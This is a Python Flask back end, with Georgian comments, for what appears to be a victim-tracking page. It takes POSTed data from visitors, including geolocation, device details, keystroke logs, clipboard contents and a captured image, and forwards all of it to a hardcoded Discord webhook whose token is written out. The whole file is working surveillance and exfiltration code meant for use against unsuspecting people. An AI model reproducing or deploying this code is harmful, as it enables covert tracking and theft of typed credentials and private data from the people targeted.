from flask import Flask, request, render_template
from flask_cors import CORS
import requests
import base64
import os

app = Flask(__name__)
CORS(app)

# 🚨 შენი დისქორდის ლინკი
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1570497608663965843/5ikHZy4Dhpeq3tEwLgr8_OA6uioiLtxNixed3peUnOv-32HFyNrEJ1Mw0yxQw3A0RH-M"

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/upload_all', methods=['POST'])
def upload_all():
    try:
        data = request.json
        
        # ლოკაციის ტექსტი
        if data.get('lat') and data['lat'] != "უარი":
            maps_link = f"https://www.google.com/maps?q={data['lat']},{data['lon']}"
            location_text = f"📍 **ლოკაცია:** [დააჭირე რუკის საჩვენებლად]({maps_link})"
        else:
            location_text = "📍 **ლოკაცია:** მომხმარებელმა უარი თქვა"

        # ტექსტური ინფორმაცია
        content = f"""
🚨 **ახალი მონაცემი! (ღილაკი: {data.get('source', 'უცნობია')})**

{location_text}

💻 **მოწყობილობა:**
• **ბრაუზერი:** `{data.get('userAgent', 'უცნობია')}`
• **ეკრანი:** `{data.get('screen', 'უცნობია')}`
• **RAM:** `{data.get('ram', 'უცნობია')}`
• **ბატარეა:** `{data.get('battery', 'უცნობია')}`

⌨️ **კლავიატურის ჩაწერა:**
`{data.get('keylogs', 'ვერაფერი აკრიფა')}`

📋 **კლიპბორდი:**
`{data.get('clipboard', 'ვერ წაიკითხა')}`
        """
        
        # 1. ვაგზავნით ტექსტურ ინფორმაციას
        requests.post(DISCORD_WEBHOOK_URL, json={"content": content})
        
        # 2. თუ ფოტოც მოვიდა, ვაგზავნით ფოტოსაც
        if data.get('image'):
            image_data = data['image'].replace("data:image/png;base64,", "")
            image_bytes = base64.b64decode(image_data)
            files = {"file": ("foto.png", image_bytes, "image/png")}
            requests.post(DISCORD_WEBHOOK_URL, files=files)
            print("📸 ფოტოც წარმატებით გაიგზავნა!")
        
        print("✅ ყველა მონაცემი წარმატებით გაიგზავნა!")
        return "წარმატება"
    except Exception as e:
        print(f"❌ შეცდომა: {e}")
        return "შეცდომა"

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)
